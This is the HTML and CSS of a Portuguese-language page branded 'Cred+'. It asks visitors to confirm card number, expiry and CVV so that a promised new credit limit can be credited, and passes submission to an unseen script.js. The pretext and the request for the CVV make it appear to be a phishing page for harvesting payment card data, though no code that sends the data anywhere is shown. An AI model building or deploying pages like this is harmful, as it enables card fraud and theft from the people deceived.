<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Confirmação de Cartão - Cred+</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet"/>
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background-color: #b30000;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .container {
      background-color: #fff;
      padding: 40px 30px;
      border-radius: 10px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
    }

    h2 {
      text-align: center;
      color: #333;
      margin-bottom: 20px;
      font-size: 20px;
    }

    label {
      display: block;
      margin-top: 15px;
      font-weight: 500;
      color: #555;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-top: 6px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 15px;
    }

    .form-row {
      display: flex;
      gap: 10px;
    }

    .form-row input {
      flex: 1;
    }

    .card-logos {
      margin-top: 10px;
      display: flex;
      gap: 10px;
    }

    .card-logos img {
      height: 26px;
      opacity: 0.8;
    }

    button {
      margin-top: 25px;
      width: 100%;
      padding: 14px;
      background-color: #b30000;
      color: #fff;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: 0.3s ease;
    }

    button:hover {
      background-color: #990000;
    }

    p.info-text {
      margin-top: 15px;
      font-size: 13px;
      color: #555;
      text-align: center;
    }

    @media (max-width: 500px) {
      .container {
        margin: 20px;
        padding: 30px 20px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Confirme os dados do cartão que receberá o novo limite</h2>
    <form id="card-form">
      <label for="card-number">Número do Cartão</label>
      <input type="text" id="card-number" name="card-number" maxlength="19" placeholder="0000 0000 0000 0000" required />

      <div class="card-logos">
        <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa">
        <img src="https://img.icons8.com/color/48/000000/mastercard.png" alt="Mastercard">
        <img src="https://img.icons8.com/color/48/000000/amex.png" alt="Amex">
      </div>

      <div class="form-row">
        <div>
          <label for="validade">Validade</label>
          <input type="text" id="validade" name="validade" maxlength="5" placeholder="MM/AA" required />
        </div>
        <div>
          <label for="cvv">CVV</label>
          <input type="text" id="cvv" name="cvv" maxlength="4" placeholder="123" required />
        </div>
      </div>

      <button type="submit">Confirmar</button>

      <p class="info-text">
        O novo limite será disponibilizado em até 2 a 5 dias úteis após análise.
      </p>
    </form>
  </div>

  <script src="script.js"></script>
</body>
</html>
